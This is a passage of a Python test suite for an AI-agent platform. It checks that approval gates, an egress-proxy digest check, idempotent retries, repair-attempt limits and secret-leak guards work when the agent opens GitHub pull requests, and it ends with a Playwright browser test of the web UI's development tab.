    monkeypatch.setenv("AIAGENT_GITHUB_TOKEN", "gh_test_tok_secret_123")

    app = create_app(
        dbs["api"],
        sentinel=LocalSentinel(sentinel),
        egress_proxy=proxy_url,
        tool_gateway_db=dbs["tool_gateway"],
    )
    headers = {"Authorization": f"Bearer {tenant['token']}"}

    try:
        with TestClient(app) as client:
            r_p = client.post(
                "/v1/development/projects",
                headers=headers,
                json={
                    "projectId": "proj-gh-1",
                    "name": "GH App",
                    "repository": "org/gh-app",
                    "defaultBranch": "main",
                    "githubApiBase": f"http://api.github.test:{gh_port}",
                },
            )
            assert r_p.status_code == 201, r_p.text
            r_p2 = client.post(
                "/v1/development/projects",
                headers=headers,
                json={
                    "projectId": "proj-gh-other",
                    "name": "Other App",
                    "repository": "org/other-app",
                    "defaultBranch": "main",
                    "githubApiBase": f"http://api.github.test:{gh_port}",
                },
            )
            assert r_p2.status_code == 201, r_p2.text

            cycle_id, commit_sha, created, claim, _ = _seed_code_ready_cycle(
                dbs, tenant, project_id="proj-gh-1", repository="org/gh-app"
            )
            other_cycle_id, other_sha, _, _, _ = _seed_code_ready_cycle(
                dbs, tenant, project_id="proj-gh-other", repository="org/other-app"
            )

            # Seed canonical approved & unapproved intents with exact canonical_pr_request digest
            intent_id, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Approved Phase 7 PR",
                body="Exact approved body",
                draft=True,
                approved=True,
            )
            unapproved_intent_id, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Approved Phase 7 PR",
                body="Exact approved body",
                draft=True,
                approved=False,
            )

            # 1. Unapproved tool intent is strictly denied 403 (zero outbound POSTs)
            r_unapp = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-unapp-1"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": unapproved_intent_id,
                    "title": "Approved Phase 7 PR",
                    "body": "Exact approved body",
                    "draft": True,
                },
            )
            assert r_unapp.status_code == 403 and len(post_hits) == 0

            # 2. P0-01: Approved intent CANNOT be diverted to a different repository/project (403, 0 POSTs)
            r_wrong_repo = client.post(
                "/v1/development/projects/proj-gh-other/integrations",
                headers={**headers, "Idempotency-Key": "idem-wrong-repo"},
                json={
                    "cycleId": other_cycle_id,
                    "expectedHeadSha": other_sha,
                    "intentId": intent_id,
                    "title": "Approved Phase 7 PR",
                    "body": "Exact approved body",
                    "draft": True,
                },
            )
            assert r_wrong_repo.status_code == 403 and len(post_hits) == 0

            # 3. P0-01: Tampering approved title / draft=False is denied 403 (0 POSTs)
            tamper_intent, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Approved Title",
                body="Exact body",
                draft=True,
                approved=True,
            )
            r_tamper = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-tamper-title"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": tamper_intent,
                    "title": "TAMPERED Title",
                    "body": "Exact body",
                    "draft": False,
                },
            )
            assert r_tamper.status_code == 403 and len(post_hits) == 0

            # 4. P0-01: Direct EgressProxy path & body digest verification rejects tampered payload even with valid permit
            proxy_test_intent, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                approved=True,
            )
            good_body = b'{"title":"a"}'
            bad_body = b'{"title":"evil"}'
            permit = sentinel.authorize(
                claim,
                proxy_test_intent,
                "http",
                "api.github.test",
                gh_port,
                "POST",
                target_path="/repos/org/gh-app/pulls",
                body_sha256=hashlib.sha256(good_body).hexdigest(),
            )
            with pytest.raises(ForwardProxyError) as exc_body:
                _run(
                    send_via_forward_proxy(
                        proxy_url,
                        identity="tool_gateway",
                        permit=permit,
                        method="POST",
                        target_url=f"http://api.github.test:{gh_port}/repos/org/gh-app/pulls",
                        host_header=f"api.github.test:{gh_port}",
                        headers={"Content-Type": "application/json"},
                        body=bad_body,
                    )
                )
            assert exc_body.value.post_send is False and len(post_hits) == 0

            # 5. P1-04: Remote branch ref SHA mismatch refuses PR creation (409, 0 POSTs)
            stale_ref_intent, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Stale ref check",
                body="body",
                draft=True,
                approved=True,
            )
            gh_state["remote_ref_sha"] = "9" * 40
            r_stale_ref = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-stale-ref"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": stale_ref_intent,
                    "title": "Stale ref check",
                    "body": "body",
                    "draft": True,
                },
            )
            assert r_stale_ref.status_code == 409 and len(post_hits) == 0
            gh_state["remote_ref_sha"] = commit_sha

            # 6. P1-03: Approved intent hits post-send disconnect -> 502 EFFECT_UNKNOWN + canonical ledger UNKNOWN
            # Need a fresh approved intent (since intent_id above had a FAILED row from proj-gh-other attempt)
            main_intent_id, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Approved Phase 7 PR",
                body="Exact approved body",
                draft=True,
                approved=True,
            )
            gh_state["post_mode"] = "drop"
            r_drop = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-pr-42"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": main_intent_id,
                    "title": "Approved Phase 7 PR",
                    "body": "Exact approved body",
                    "draft": True,
                    "maxRepairAttempts": 2,
                    "requiredChecks": ["integration-pytest"],
                },
            )
            assert r_drop.status_code == 502, r_drop.text
            assert r_drop.json()["error"] == "EFFECT_UNKNOWN"
            pr_rec_id = r_drop.json()["prRecord"]["id"]
            assert len(post_hits) == 1

            # Verify canonical tool_intents & side_effect_records synced to UNKNOWN
            st_row = dbs["owner"].one(
                "SELECT i.status_code, se.outcome_code FROM agent.tool_intents i"
                " LEFT JOIN agent.side_effect_records se ON se.tenant_id=i.tenant_id AND se.tool_intent_id=i.id"
                " WHERE i.tenant_id=%s AND i.id=%s",
                (tenant["tenantId"], main_intent_id),
            )
            assert st_row is not None and st_row["status_code"] == "UNKNOWN" and st_row["outcome_code"] == "UNKNOWN"

            # 7. P1-03: Re-submitting SAME Idempotency-Key refuses blind retry (409, 0 extra POSTs)
            r_retry_same = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-pr-42"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": main_intent_id,
                    "title": "Approved Phase 7 PR",
                    "body": "Exact approved body",
                    "draft": True,
                },
            )
            assert r_retry_same.status_code == 409 and r_retry_same.json()["reconcileRequired"] is True
            assert len(post_hits) == 1

            # 8. P1-03: Re-submitting with a DIFFERENT Idempotency-Key for same intent_id ALSO refuses (409, 0 extra POSTs)
            r_retry_diff = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-pr-42-BRAND-NEW-KEY"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": main_intent_id,
                    "title": "Approved Phase 7 PR",
                    "body": "Exact approved body",
                    "draft": True,
                },
            )
            assert r_retry_diff.status_code == 409 and r_retry_diff.json()["reconcileRequired"] is True
            assert len(post_hits) == 1

            # 9. P1-03 + P1-04: Malformed JSON response AND response head.sha mismatch BOTH settle to EFFECT_UNKNOWN
            mal_intent, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Malformed JSON test",
                body="body",
                draft=True,
                approved=True,
            )
            gh_state["post_mode"] = "malformed_json"
            r_mal = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-malformed-json"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": mal_intent,
                    "title": "Malformed JSON test",
                    "body": "body",
                    "draft": True,
                },
            )
            assert r_mal.status_code == 502 and r_mal.json()["error"] == "EFFECT_UNKNOWN"

            mismatch_intent, _ = _seed_approved_pr_intent(
                dbs,
                tenant,
                task_id=created["taskId"],
                run_id=created["runId"],
                goal_revision=claim.goal_revision,
                project_id="proj-gh-1",
                cycle_id=cycle_id,
                repository="org/gh-app",
                branch="feat/p7-demo",
                head_sha=commit_sha,
                title="Head mismatch test",
                body="body",
                draft=True,
                approved=True,
            )
            gh_state["post_mode"] = "normal"
            gh_state["pr_response_head_sha"] = "8" * 40
            r_mm = client.post(
                "/v1/development/projects/proj-gh-1/integrations",
                headers={**headers, "Idempotency-Key": "idem-head-mismatch"},
                json={
                    "cycleId": cycle_id,
                    "expectedHeadSha": commit_sha,
                    "intentId": mismatch_intent,
                    "title": "Head mismatch test",
                    "body": "body",
                    "draft": True,
                },
            )
            assert r_mm.status_code == 502 and r_mm.json()["error"] == "EFFECT_UNKNOWN"
            gh_state["pr_response_head_sha"] = commit_sha

            # 10. P1-05: Read-only Sentinel reconcile finds PR #42 and settles BOTH dev_pr_records & tool_intents to CONFIRMED
            r_rec = client.post(f"/v1/development/prs/{pr_rec_id}/reconcile", headers=headers)
            assert r_rec.status_code == 200, r_rec.text
            assert r_rec.json()["reconciled"] is True
            assert r_rec.json()["prRecord"]["effectStatus"] == "CONFIRMED"
            assert r_rec.json()["prRecord"]["prNumber"] == 42

            confirmed_row = dbs["owner"].one(
                "SELECT status_code FROM agent.tool_intents WHERE tenant_id=%s AND id=%s",
                (tenant["tenantId"], main_intent_id),
            )
            assert confirmed_row is not None and confirmed_row["status_code"] == "CONFIRMED"

            # 11. P1-05 + P2-10: Read-only guardian-check THROUGH REAL EGRESS PROXY succeeds in CONFIRMED state
            #     and consumes 0 repair attempts!
            g_ro = client.post(f"/v1/development/prs/{pr_rec_id}/guardian-check", headers=headers, json={})
            assert g_ro.status_code == 200, g_ro.text
            assert g_ro.json()["evaluation"]["ciState"] == "FAIL"
            assert g_ro.json()["repairClaimed"] is False
            assert g_ro.json()["prRecord"]["repairAttempts"] == 0

            # 12. P2-10: Concurrent claimRepair=True strictly caps repairAttempts at maxRepairAttempts=2
            barrier = threading.Barrier(4)

            def _claim_slot() -> dict[str, Any]:
                barrier.wait(timeout=10)
                with TestClient(app) as c_thr:
                    resp = c_thr.post(
                        f"/v1/development/prs/{pr_rec_id}/guardian-check",
                        headers=headers,
                        json={"claimRepair": True},
                    )
                    assert resp.status_code == 200, resp.text
                    return dict(resp.json())

            with ThreadPoolExecutor(max_workers=4) as pool:
                results = list(pool.map(lambda _: _claim_slot(), range(4)))
            claimed_count = sum(1 for r in results if r["repairClaimed"] is True)
            assert claimed_count == 2, f"Expected exactly 2 atomic repair slots, got {claimed_count}"
            assert max(r["prRecord"]["repairAttempts"] for r in results) == 2

            # Subsequent check confirms ESCALATED_LIMIT_REACHED and repairAttempts remains 2
            g_esc = client.post(
                f"/v1/development/prs/{pr_rec_id}/guardian-check", headers=headers, json={"claimRepair": True}
            )
            assert g_esc.status_code == 200
            assert g_esc.json()["evaluation"]["ciState"] == "ESCALATED_LIMIT_REACHED"
            assert g_esc.json()["evaluation"]["escalated"] is True
            assert g_esc.json()["repairClaimed"] is False
            assert g_esc.json()["prRecord"]["repairAttempts"] == 2

            # 13. P1-09: Stale live PR head.sha returns STALE_HEAD (never PASS), and missing requiredCheck returns UNKNOWN
            gh_state["check_runs"] = [{"name": "other-check", "status": "completed", "conclusion": "success"}]
            gh_state["live_pr_head_sha"] = "7" * 40
            g_stale = client.post(f"/v1/development/prs/{pr_rec_id}/guardian-check", headers=headers, json={})
            assert g_stale.status_code == 200 and g_stale.json()["evaluation"]["ciState"] == "STALE_HEAD"

            gh_state["live_pr_head_sha"] = commit_sha
            g_missing = client.post(f"/v1/development/prs/{pr_rec_id}/guardian-check", headers=headers, json={})
            assert g_missing.status_code == 200 and g_missing.json()["evaluation"]["ciState"] == "UNKNOWN"
            assert "integration-pytest" in g_missing.json()["evaluation"]["missingRequiredChecks"]

            # 14. P2-13: Production Authorization header was sent and NEVER leaked to DB or events
            assert "Bearer gh_test_tok_secret_123" in seen_auth_headers
            leaked_ev = dbs["owner"].one(
                "SELECT count(*) AS n FROM agent.domain_events WHERE tenant_id=%s AND payload_json::text LIKE %s",
                (tenant["tenantId"], "%gh_test_tok_secret_123%"),
            )
            assert leaked_ev is not None and int(leaked_ev["n"]) == 0
            leaked_pr = dbs["owner"].one(
                "SELECT count(*) AS n FROM agent.dev_pr_records WHERE tenant_id=%s"
                " AND (COALESCE(last_error_code,'') LIKE %s OR COALESCE(pr_url,'') LIKE %s)",
                (tenant["tenantId"], "%gh_test_tok_secret_123%", "%gh_test_tok_secret_123%"),
            )
            assert leaked_pr is not None and int(leaked_pr["n"]) == 0
    finally:
        proxy_loop.call_soon_threadsafe(proxy_loop.stop)
        proxy_thread.join(timeout=5)
        loop.call_soon_threadsafe(loop.stop)
        gh_th.join(timeout=5)


def test_phase7_web_ui_development_tab_playwright_e2e(dbs: dict[str, Database], tenant: dict[str, str]) -> None:
    """DEV-09 UI E2E: Development tab project creation, 3-candidate Design Picker, and Demo approval dialog in Chromium."""
    playwright_async = pytest.importorskip("playwright.async_api")
    async_playwright = playwright_async.async_playwright
    dist_dir = Path(__file__).resolve().parents[2] / "web" / "dist"
    assert (dist_dir / "index.html").is_file(), "Run `npm run build` in web/ before Playwright E2E"

    store = PostgresDevStore(dbs["api"])
    store.create_project(
        tenant_id=tenant["tenantId"],
        owner_user_id=tenant["userId"],
        workspace_id=tenant["workspaceId"],
        project_id="proj-ui-1",
        name="Seeded UI App",
        repository="org/ui-app",
    )
    cycle_id, _, _, _, _ = _seed_code_ready_cycle(dbs, tenant, project_id="proj-ui-1", repository="org/ui-app")
    store.create_design_proposal(
        tenant_id=tenant["tenantId"],
        owner_user_id=tenant["userId"],
        cycle_id=cycle_id,
        candidates=[
            {
                "candidateId": "cand-a",
                "label": "Modern Clean",
                "fixtureRef": "fixture://v1",
                "summary": "Light card UI",
            },
            {
                "candidateId": "cand-b",
                "label": "Studio Dark",
                "fixtureRef": "fixture://v1",
                "summary": "Dark studio UI",
            },
            {"candidateId": "cand-c", "label": "Classic Pro", "fixtureRef": "fixture://v1", "summary": "Dense data UI"},
        ],
    )

    app = create_app(dbs["api"], web_dist_dir=dist_dir)
    api_port, uv_srv, uv_th, uv_sock = _start_uvicorn_thread(app)
    base_url = f"http://127.0.0.1:{api_port}"

    async def _drive() -> None:
        page_errors: list[str] = []
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(viewport={"width": 1280, "height": 800})
            page = await context.new_page()
            page.on("pageerror", lambda err: page_errors.append(str(err)))
            try:
                await page.goto(base_url, wait_until="networkidle")
                await page.get_by_label("APIトークン").fill(tenant["token"])
                await page.get_by_role("button", name="セッション開始").click()
                await page.get_by_text("AUTHENTICATED").wait_for(timeout=10000)

                await page.get_by_test_id("tab-development").click()
                await page.get_by_test_id("development-panel").wait_for(timeout=10000)

                # Register a new project via UI form
                await page.get_by_label("プロジェクト名").fill("New E2E Project")
                await page.get_by_label("リポジトリ").fill("org/new-e2e-app")
                await page.get_by_role("button", name="プロジェクト登録").click()
                await page.get_by_text("New E2E Project").wait_for(timeout=10000)

                # Select seeded project and cycle -> inspect 3 candidates -> select cand-b -> approve Demo via ConfirmDialog
                await page.get_by_test_id("dev-project-proj-ui-1").click()
                await page.get_by_test_id(f"dev-cycle-{cycle_id}").click()
                await page.get_by_test_id("design-candidate-cand-b").wait_for(timeout=10000)
                await (
                    page.get_by_test_id("design-candidate-cand-b").get_by_role("button", name="この候補を選択").click()
                )
                await page.get_by_test_id("design-candidate-cand-b").get_by_text("[選択中]").wait_for(timeout=10000)

                await page.get_by_role("button", name="Demo を承認 (APPROVED)").click()
                dlg = page.get_by_test_id("confirm-dialog")
                await dlg.wait_for(timeout=10000)
                await dlg.get_by_text("Tool 承認にはなりません").wait_for(timeout=10000)
                await page.get_by_test_id("confirm-dialog-confirm").click()
                await page.get_by_test_id("dev-demo-status").get_by_text("APPROVED").wait_for(timeout=10000)
                assert page_errors == []
            finally:
                await context.close()
                await browser.close()

    try:
        _run(_drive())
    finally:
        uv_srv.should_exit = True
        uv_th.join(timeout=5)
        uv_sock.close()
